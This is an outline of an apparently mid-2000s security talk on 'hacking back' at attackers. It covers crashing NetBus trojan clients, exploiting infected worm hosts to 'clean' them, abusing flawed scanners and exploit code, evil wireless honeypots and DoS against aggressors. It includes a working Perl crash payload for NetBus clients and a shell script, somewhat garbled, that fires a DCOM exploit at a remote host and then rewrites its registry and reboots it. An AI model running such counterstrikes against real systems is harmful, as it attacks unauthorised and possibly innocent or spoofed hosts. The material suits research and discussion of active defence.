# Optimized Text

## Introduction
If (Syn|Ack) then Rst  
Syn  
Hacking Back?

## Fighting Back Against Usual Clients
- **Scenario:** Consider what would happen if attackers used vulnerable or misconfigured clients.
  - Web clients (e.g., Internet Explorer)
  - SSH clients (e.g., PuTTY, OpenSSH)
  - Mail clients (e.g., Outlook)
  - DNS resolvers
  - IRC clients

- **Consequences:** A remote control or crash of these clients would be possible, which could be very interesting for self-defense.

- **Challenges:**
  - This is not an easy task and may remain theoretical.
  - Attacking a listening client (e.g., a mail client) might be easier because you can attempt the attack multiple times.
  - Attacking an incoming client (e.g., a web client) may be a one-shot operation during a specific phase.
  - Specific information is needed to launch such an attack, including:
    - Operating System/Hardware (e.g., p0f)
    - Version (e.g., "Banner")

## Exploiting Exploits
- **Vulnerabilities in Exploit Code:**
  - Imagine if there were vulnerabilities in the code of an exploit, such as buffer overflows or string format issues.
  - Have you ever audited the source code of exploits? Not just the payload, but the entire script.
  - Script kiddies often do not understand the source code, leading to issues like "When I launched dcom-xpl.c, it did not work!?"
  - Automatic tools used to launch remote attacks or audits are generally well-written (e.g., NASL for Nessus, Python for Core Impact).

## Playing with Scanners
- **Types of Scanners:**
  - Network layer scanners
  - Banner grabbers
  - Security test scanners

- **Security Concerns:**
  - Some scanners are poorly designed from a security perspective and can lead to vulnerabilities, such as buffer overflows and format strings.
  - Reports generated by these scanners may include banners grabbed from targets without proper data validation.

## Trojan Horse Clients
- **Incoming Probes:**
  - How many times have you received an incoming probe for a Trojan port on your internal network?
  - If there are vulnerabilities in the code of a Trojan horse client, a counterattack would be possible.
  - It has been observed that some young blackhats use the same kind of backdoor in a chain of bounce. If you can steal the password/method/tool from one host, you might be able to trace back to the original attacker.

## Retaliation: NetBus Client
- **Script Example:**
  - Bind this script on port TCP12345 (using netcat, inetd, socat, etc.).
  - **Netbus Assassin Script (nb.pl):** Crashes remote NetBus clients.
  ```perl
  #!/usr/bin/perl
  $banner = "NetBus 1.6\r";
  syswrite STDOUT, $banner;
  my $byte;
  while (sysread(STDIN, $byte, 100) >= 0) {
      if($byte =~ m/^GetInfo\r$/) {
          $ans = "Info;Program Path: C:\\Documents and Settings\\Administrator\\Patch.exe" . "A" x 100000 . "|Restart persistent: Yes|Login ID: Administrator|Clients connected to this host: 1\r";
          syswrite STDOUT, $ans;
      }
  }
  ```

## Honeyd versus NetBus Client
- **Steps:**
  1. NetBus client connects...
  2. User clicks “Get Info” (CPU!)
  3. State becomes undefined (Coma)

## Worms and Self-Defense Technology
- **Infection Attempt:**
  - Worm i+1
  - Reaction
  - Worm i-1
  - Reaction
  - Worm i
  - Reaction

- **Handling Worm Problems:**
  - **Theory:** A worm W comes from host A to host H.
    - A is infected by W.
    - A is (was) vulnerable to the attack used by W.
    - A may still be vulnerable.
    - H attacks A through this vulnerability.
    - H takes control of A, cleans A, patches A, hardens A, etc.
  - **Proof of Concept:**
    - Honeyd versus MSBlast
    - References:
      - SecurityFocus - Infocus, October 2003: "Fighting Internet Worms With Honeypots"
        - [Link](http://www.securityfocus.com/infocus/1740)
      - Black Hat Asia, December 2003
        - [Link](http://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-oudot/slides/bh-asia-03-oudot.pdf)

- **Example Script:**
  ```sh
  #!/bin/sh
  # Launch the exploit against the internal infected attacker
  # Then execute commands to purify the victim
  /usr/local/bin/evil_exploit_dcom -d $1 -t 1 -l 4445 c:\cleaner_msblast.reg
  echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> c:\cleaner_msblast.reg
  echo "windows auto update" = "REM msblast" >> c:\cleaner_msblast.reg
  regedit /s c:\cleaner_msblast.reg
  del /f c:\cleaner_msblast.reg
  shutdown -r -f -t 0
  exit
  EOF
  ```

## Wireless Honeypots
- **References:**
  - SecurityFocus - Infocus, February 2003: "Wireless Honeypot Trickery”, L.OUDOT
    - [Link](http://www.securityfocus.com/infocus/1761)
  - Evil honeypots in the wireless world:
    - Unofficial Access Point with fake resources (used to steal passwords)
    - Rogue Access Point (proposes unprotected wireless access and attacks clients)
    - Hacking the hackers (wardrivers trying to find open APs for free, anonymous access)

## Wireless Tunnels
- **NSTX:**
  - Used to create IP traffic over DNS (useful for blackhats on WiFi networks with open DNS).
  - Advisory Number: RSTACK-20040325
    - [Link](http://www.securityfocus.com/archive/1/358765)
  - Fingerprinting NSTX: The nstx version 1.0 always uses a tunnel with a UDP source port of 54…

## Other Ideas
- **Boomerang Effect:**
  - Proxy aggression back to the aggressor.
- **Audit the Auditor:**
  - Try to gather similar information on the aggressor (e.g., scan).
- **DOS/DDoS:**
  - Target the client or its infrastructure.

## Real Examples
- **Code Red II / Anti-Code Red II:**
  - "default.ida" script strikes back by abusing the remote CRII.
- **Symbiot.com Technologies:**
  - Additional real-life examples and technologies.

## Requirements
- **Graduated Response:**
  - Level of reactions to strike back with a proportional response.
  - A too aggressive posture could be dangerous.
- **Hostile Host Determination:**
  - Based on behavior, intrusion detection analysis, etc.
  - Risk of false positives.
- **Attack Profiling:**
  - Probes, scanners, exploits, clients, malware, worms, DoS, etc.
  - Choose the appropriate strike-back possibility.
  - Real-life example: DEFense CONdition (DEFCON levels).

## Specific Opportunities
- **Self-Defense and Honeypots:**
  - Honeypots are non-production systems used to delude attackers.
  - Incoming traffic is suspicious, making the decision to launch a counterstrike easier.
  - Honeypots are useful for aggressive defense purposes.
  - References:
    - Cansecwest 2004, Vancouver: "Towards evil honeypots, when they bite back", L.OUDOT
    - HOPE 2004, New York: "Retaliation with honeypots"
    - Honeynet Project: [Link](www.honeynet.org) (Honeywall CD)

## Internal Computers
- **Official Remote Administrator Access:**
  - Possible on internal computers/devices.
  - Useful to protect the network by stopping processes, adding firewall rules, rebooting, modifying files, and patching.
  - Helps avoid fast propagation of worms.

## Handling Internal Threats
- **Local Area Network:**
  - Striking back at your own computers (under legal control).
  - Useful for finding corporate hackers and zealot end-users.
  - Potential risk: spoofing is easier on a LAN (Layer 2 attacks, etc.).

## Technical Limitations
- **Counterstrike Technologies:**
  - May not exist for all types of threats.
  - Need remote exploits for each worm, evil tool, etc.
- **False Positives, Spoofing, Collateral Damage:**
  - These are significant concerns.

## Conclusions
- **Cool Geeks:**
  - Interesting technology, feeling of doing something right.
  - New possibilities to explore for protecting infrastructure.
- **Managers:**
  - Legal issues.
  - Counterstrike can target internal computers/devices.
  - Adds In-Depth Security capabilities (advanced IPS).
- **Blackhats:**
  - Another way to attack (e.g., evil honeypots).
- **Future:**
  - Automatic aggressive defense is still dangerous.
  - Passive vs. Active Defense? Future technologies? Future laws? Culture?

## Questions and Greetings
- **Questions?**
- **Greetz:**
  - MISC Mag, Dragos Ruiu, Dave Dittrich, Jennifer Granick, Barbara Moran, Nicolas Fischbach, Philippe Biondi, Frederic Raynal, Folks from Rstack.org